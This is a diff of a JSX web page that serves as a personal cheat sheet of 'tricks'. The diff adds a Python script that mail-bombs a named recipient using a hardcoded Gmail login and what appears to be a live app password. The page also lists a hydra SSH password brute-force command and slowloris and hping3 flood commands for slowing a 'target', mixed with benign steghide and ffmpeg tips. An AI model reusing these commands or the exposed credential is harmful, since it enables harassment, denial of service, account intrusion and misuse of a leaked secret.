@@ -112,16 +112,36 @@ SSH =>1)sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip> -t 4 ssh
 
       {/*  Tricks */}
       <div style={{textAlign:'left',paddingLeft:'20px',}}>
-        <h1>Tricks</h1>
-        <h1 style={{color:'Yellow'}}>1)Hide content in images(Steghide)</h1>
+        <h1 style={{color:'green'}}>Tricks</h1>
+        <h1 style={{color:'Yellow'}}>1)Bomb friend's mail</h1>
+        <pre style={{color:'white'}}>
+          <code>
+            {`
+              import smtplib
+              subject = 'Hey Mega_Bot'
+              body = 'Beware of me!!!'
+              message = f'Subject: {subject}\\n\\n{body}'
+              server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+              server.login("kmv.abhiram@gmail.com", "dmry zkpw ptln iati")
+              i = 1
+              while i < 20:
+                server.sendmail("kmv.abhiram@gmail.com", "koyaprabhas1@gmail.com", message)
+                i += 1
+              server.quit()
+            `}
+          </code>
+        </pre>
+        <h1 style={{color:'Yellow'}}>2)Hide content in images(Steghide)</h1>
         <h2 style={{color:'white'}}>.....steghide embed -ef res.txt -cf input.jpg -sf out.jpg</h2>
         <h2 style={{color:'white'}}>.....Extraction:steghide extract -sf out.jpg</h2>
-        <h1 style={{color:'Yellow'}}>2)Slow target's browser</h1>
+        <h1 style={{color:'Yellow'}}>3)Slow target's browser</h1>
         <h2 style={{color:'white'}}>.....nmap --script http-slowloris ip,install from git (slowloris)Last:-perl slowloris.pl -dns ip Linux inbuilt:sudo hping3 ip -1 --fast</h2>
-        <h1 style={{color:'Yellow'}}>3)Convert images to sequential video</h1>
+        <h1 style={{color:'Yellow'}}>4)Convert images to sequential video</h1>
         <h2 style={{color:'white'}}>.....ffmpeg -framerate 0.5 -i ~/testimg/%d.jpg -vf "scale=512:-2" -c:v libx264 -pix_fmt yuv420p realone.mp4</h2>
-        <h1 style={{color:'Yellow'}}>4)File Location- </h1>
+        <h3 style={{color:'white'}}>.....ffmpeg-tool , 0.5 (2sec for a frame) , input path , scale , default ones , output</h3>
+        <h1 style={{color:'Yellow'}}>5)File Location- </h1>
         <h2 style={{color:'white'}}>.....readlink -f abcd.txt</h2>
+        <h1></h1>
       </div>
 
       <div style={{display:'flex',alignItems:'center'}}>
